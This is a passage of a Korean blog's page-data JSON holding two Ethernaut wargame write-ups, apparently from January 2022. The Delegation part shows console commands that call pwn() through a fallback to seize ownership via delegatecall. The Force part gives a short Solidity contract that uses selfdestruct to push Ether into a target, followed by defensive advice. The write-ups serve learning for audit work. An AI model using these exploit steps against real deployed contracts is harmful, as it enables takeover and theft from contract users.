class=\"language-javascript\"><span class=\"token comment\">// 기존의 owner를 확인한다.</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// web3 library를 사용한다.</span>\n<span class=\"token comment\">// encodePwn라는 변수에 pwn()을 4 byte keccak hash로 변형해 저장한다.</span>\n<span class=\"token keyword\">const</span> encodePwn <span class=\"token operator\">=</span> web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeFunctionSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn()\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// Delegation contract의  fallback function을 call한다. </span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">sendTransaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">data</span><span class=\"token operator\">:</span> encodePwn<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// owner가 자신인 것을 확인한다.</span>\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>완료 후 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>delegatecall 은 low level function이라 아직 내가 완벽하게 이해했다고 말할 수는 없을 것 같다. ethernaut을 다 풀어본 후에 EVM에 대해 좀 더 깊히 배워야겠다는 생각이 든다. 왜냐면 나는 그냥 smart contract 개발자가 아닌 auditor가 되고싶기 때문이다!!!! 앞으로도 화이팅하자!</p>\n<hr>\n<h2 id=\"기타-정보\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"기타 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>기타 정보</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n<li>DelegateCall 취약점 :<a href=\"https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/\">https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/</a></li>\n<li>Solidity Docs delegate call: <a href=\"https://docs.soliditylang.org/en/v0.8.10/introduction-to-smart-contracts.html\">https://docs.soliditylang.org/en/v0.8.10/introduction-to-smart-contracts.html</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">승리 조건</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">코드 분석</a></p>\n</li>\n<li>\n<p><a href=\"#%ED%92%80%EC%9D%B4\">풀이</a></p>\n<ul>\n<li><a href=\"#delegate-call\">Delegate Call</a></li>\n<li><a href=\"#fallback\">fallback</a></li>\n<li><a href=\"#method-id\">method id</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\">기타 정보</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"January 09, 2022","title":"(Ethernaut 취약점 6) Delegation","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/CTFs/6_delegation_ethernaut/6_delegation_ethernaut/"}},"prev":{"id":"9e562f10-a89a-50e9-9e46-6bd156e36fad","html":"<h1 id=\"-force\" style=\"position:relative;\"><a href=\"#-force\" aria-label=\" force permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 Force</h1>\n<p><strong>Difficulty 5/10</strong></p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>Force contract의 balance를 0보다 크게 만든다면 승리한다.</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>분석은 주석에!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// 코드가 없다...? 롸...? 이것은 무엇인가....</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Force</span> <span class=\"token punctuation\">{</span><span class=\"token comment\">/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/</span><span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h3 id=\"풀이를-위한-setup\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4%EB%A5%BC-%EC%9C%84%ED%95%9C-setup\" aria-label=\"풀이를 위한 setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이를 위한 Setup</h3>\n<p><a href=\"https://remix.ethereum.org\">RemixIDE</a>를 사용한다.\nremix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 찾아보자!\n그리고 docs를 읽어본다면 사용법을 쉽게 익힐 수 있을 것이다.</p>\n<p>한 가지 주의할 점은 Force는 remix에서 바로 deploy하는 것이 아니라 ethernauts에서 만든 instance의 주소를 가지고 addressAt을 누르면 된다.\n또한 우리는 Rinkeby Network를 사용하고 있으니 ENVIRONMENT를 “Injected Web3”를 선택해주어야 한다.</p>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>이 문제에서 우리의 목표는 Force contract의 balance를 0을 초과하게 만드는 것이다.</p>\n<p>코드가 없는데 어떻게 Ether를 보내라는 것인가 싶었다.</p>\n<p>하지만 contract에 강제로 보낼 수 있는 방법이 존재한다!</p>\n<p>바로 <a href=\"https://holyhansss.github.io/vulnerability/selfdestruct/selfdestruct/\">selfdestruct</a>이다. &#x3C;= Click selfdestruct</p>\n<p>selfdestruct의 개념을 안다면 이 문제는 매우 쉽게 풀릴 수 있다.</p>\n<p>우리가 Force의 balance를 0을 넘게하기 위한 시나리오는 이렇다.</p>\n<ol>\n<li>ForceAttack contract에 selfdestruct을 사용하는 function과 value를 조금 넣어 deploy한다.</li>\n<li>Deploy한 contract에서 selfdestruct를 실행시킨다. selfdestruct의 parameter는 Force contract의 주소이다.</li>\n<li>Force contract는 강제로 Ether를 받게된다.</li>\n</ol>\n<p>주석을 통해 ForceAttack contract를 같이 분석 해보자!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">AttackForce</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// payable을 사용해 Ether를 받을 수 있게 한다.</span>\n    <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    \n    <span class=\"token comment\">// Force contract의 주소를 넣어 selfdestruct한다.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _forceAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">selfdestruct</span><span class=\"token punctuation\">(</span>_forceAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>이 코드는 remix IDE에서 만들고 배포한다. 배포할때 value를 0을 초과하게 설정해준다. 이후 Force의 주소와 함께 attack() 실행해주면 공격이 완료된다.</p>\n<p>완료 후 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>selfdestruct는 항상 조심해야한다. attacker를 통해 공격을 받는 경우도 있지만 contract안에 selfdestruct를 사용하고 실수하여 문제가 일어난 적도 있다. 그렇기 때문에 selfdestruct를 꼭 필요할때 이외에는 사용을 피해보자! 또한 address(this).balance와 같이 selfdestruct에 의해 공격받을 수 있는 것은 사용을 피하도록하자.</p>\n<hr>\n<h2 id=\"기타-정보\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"기타 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>기타 정보</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n<li>selfdestruct 취약점: <a href=\"https://holyhansss.github.io/vulnerability/selfdestruct/selfdestruct/\">https://holyhansss.github.io/vulnerability/selfdestruct/selfdestruct/</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">승리 조건</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">코드 분석</a></p>\n<ul>\n<li><a href=\"#%ED%92%80%EC%9D%B4%EB%A5%BC-%EC%9C%84%ED%95%9C-setup\">풀이를 위한 Setup</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%ED%92%80%EC%9D%B4\">풀이</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\">기타 정보</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"January 09, 2022","title":"(Ethernaut 취약점 7) Force","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/CTFs/7_force_ethernaut/7_force_ethernaut/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":"holyhansss/holyhansss.github.io"}}}}},"pageContext":{"slug":"/vulnerability/selfdestruct/selfdestruct/","nextSlug":"/CTFs/6_delegation_ethernaut/6_delegation_ethernaut/","prevSlug":"/CTFs/7_force_ethernaut/7_force_ethernaut/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}